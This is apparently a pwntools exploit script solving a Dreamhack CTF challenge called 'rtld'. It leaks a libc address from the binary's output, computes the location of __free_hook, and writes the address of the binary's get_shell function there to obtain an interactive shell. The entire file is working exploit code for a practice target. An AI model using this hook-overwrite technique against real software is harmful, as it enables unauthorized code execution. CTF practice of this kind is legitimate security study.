from pwn import *
#r=remote("host1.dreamhack.games",8249)
r=process("./rtld")

b=ELF('./rtld')
context.log_level='debug'
#libc=ELF('./libc.so.6')
libc=ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
r.recvuntil("stdout: ")
libc_base=int(r.recvline().strip(),16)
libc_base=libc_base-libc.symbols['_IO_2_1_stdout_']
free=libc_base+libc.symbols['__free_hook']
print free
r.sendline(str(free))
r.sendline(str(b.symbols['get_shell']))
r.interactive()
